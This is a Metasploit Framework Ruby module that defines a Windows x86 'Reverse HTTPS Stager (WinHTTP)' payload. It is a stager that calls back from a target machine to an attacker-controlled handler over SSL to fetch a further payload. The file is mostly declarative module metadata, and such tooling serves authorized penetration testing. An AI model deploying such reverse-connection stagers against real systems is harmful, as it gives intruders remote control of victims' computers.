##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'
require 'msf/core/handler/reverse_https'
require 'msf/core/payload/windows/reverse_winhttps'


module Metasploit3

  CachedSize = 349

  include Msf::Payload::Stager
  include Msf::Payload::Windows
  include Msf::Payload::Windows::ReverseWinHttps

  def self.handler_type_alias
    "reverse_winhttps"
  end

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Reverse HTTPS Stager (WinHTTP)',
      'Description'   => 'Tunnel communication over HTTP using SSL (WinHTTP)',
      'Author'        =>
        [
          'hdm',
          'Borja Merino <bmerinofe[at]gmail.com>'
        ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X86,
      'Handler'       => Msf::Handler::ReverseHttps,
      'Convention'    => 'sockedi https'))
  end
end
